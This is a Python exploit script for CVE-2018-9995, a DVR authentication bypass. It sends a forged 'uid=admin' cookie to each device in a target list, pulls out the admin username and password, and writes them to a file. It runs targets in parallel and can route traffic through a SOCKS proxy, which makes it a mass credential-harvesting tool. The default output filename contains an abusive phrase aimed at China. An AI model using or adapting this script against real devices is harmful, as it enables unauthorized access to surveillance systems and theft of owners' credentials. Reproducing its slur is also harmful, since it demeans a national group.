import requests
from bs4 import BeautifulSoup
import json
import time
from multiprocessing import Pool
import argparse

def openurl():
    with open(args.file, 'r') as f:
        box = f.readlines()
    return box

def attack(url,name):
    f = open(name,'a+')
    r = requests.Session()
    payload ={"uid":"admin"}
    try:	
        r1=r.get("http://"+url+"/device.rsp?opt=user&cmd=list",cookies=payload,timeout=10.0)
        soup=BeautifulSoup(r1.text,"html.parser")
        j=json.loads(str(soup))
        username=j["list"][0]["uid"]
        password=j["list"][0]["pwd"]
        f.write("%s;%s;%s\n" % (url,username,password))
        f.close()
    except:
        print("[ERREO]%s" % (url))
        f.close()		

if __name__ == "__main__" :

    parser = argparse.ArgumentParser(description='CVE-2018-9995 POC\nExample:python CVE-2018-9995_V2.2.py [-proxy 127.0.0.1:9487] -f [Inputfilename.txt] -o [Outputfilename.txt] [-p 4]')
    parser.add_argument("-proxy",nargs="?",type=str,help="proxy輸入")
    parser.add_argument("-f", "--file",nargs="?",type=str,const="data.txt",help="Inputfilename.txt 檔案匯入 IP:PORT")
    parser.add_argument("-o", "--Output",nargs="?",type=str,const="Fuck China_Bata.txt", help="Outputfilename.txt 檔案匯入 IP:PORT")
    parser.add_argument("-p", "--CPU",nargs="?",type=int,default=1,help="多進程 預設1")
    args = parser.parse_args()

    global proxy
    if args.proxy:
        proxy = {'http': 'socks5://'+str(args.proxy), 'https': 'socks5://'+str(args.proxy)}

    try:
        start = time.time()
        print("\nUse CPU:%s Timeout:10s GO!\n" % (int(args.CPU)))
        box=openurl()

        p = Pool(args.CPU)	
        for i in range(len(box)):
            try:
                data=box[i].strip('\n')
                p.apply_async(attack, args=(data,args.Output,))			
            except:
                print("ERREO!!\nExample:python CVE-2018-9995_V2.2.py [-proxy 127.0.0.1:9487] -f [Inputfilename.txt] -o [Outputfilename.txt] [-p 4]")
        p.close()
        p.join()
        end = time.time()
        print('結束!，花費%f秒' % (end-start))
    except:
        print("ERREO!!\nExample:python CVE-2018-9995_V2.2.py [-proxy 127.0.0.1:9487] -f [Inputfilename.txt] -o [Outputfilename.txt] [-p 4]")
